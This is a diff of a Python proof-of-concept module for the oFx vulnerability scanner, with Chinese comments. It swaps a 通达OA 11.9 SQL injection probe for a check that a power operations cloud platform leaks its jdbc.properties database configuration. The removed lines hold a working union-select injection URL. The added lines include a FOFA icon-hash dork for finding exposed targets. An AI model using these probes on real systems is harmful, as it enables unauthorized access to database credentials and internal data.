@@ -11,23 +11,23 @@ class POC(POCBase):
     _info = {
         "author" : "hansi",                      # POC作者
         "version" : "1",                    # POC版本，默认是1  
-        "CreateDate" : "2022-09-06",        # POC创建时间
-        "UpdateDate" : "2022-09-06",        # POC创建时间
+        "CreateDate" : "2021-06-09",        # POC创建时间
+        "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "通达OA 11.9,SQL注入漏洞",                        # 漏洞名称
-        "VulnID" : "oFx-2022-0906",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "",                     # 漏洞应用名称
+        "name" : "普元电力发展有限公司电力运维云平台存在数据库配置信息泄露漏洞",                        # 漏洞名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "电力运维云平台存在数据库配置信息泄露漏洞",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
-        "VulnDate" : "2022-09-06",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "VulnDate" : "2021-09-02",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-	
+	  电力运维云平台存在数据库配置信息泄露漏洞，泄露相应的数据库配置信息。
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="TDXK-通达OA"
+            icon_hash="-1291691164"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -43,7 +43,7 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1,1&tab=5%20where%202={`=%27`%201}%20union%20(select%20CURRENT_USER(),version(),SCHEMA())--%20%27" # url自己按需调整
+        url = self.target + "/fileSystem/jdbc/jdbc.properties" # url自己按需调整
         
 
         headers = {"User-Agent":get_random_ua(),
@@ -56,7 +56,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "root@::1;td_oa;5.6.35-log"in req.text:#req.status_code == 200 and :
+            if "jdbc.properties" in req.text:#req.status_code == 200 and :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
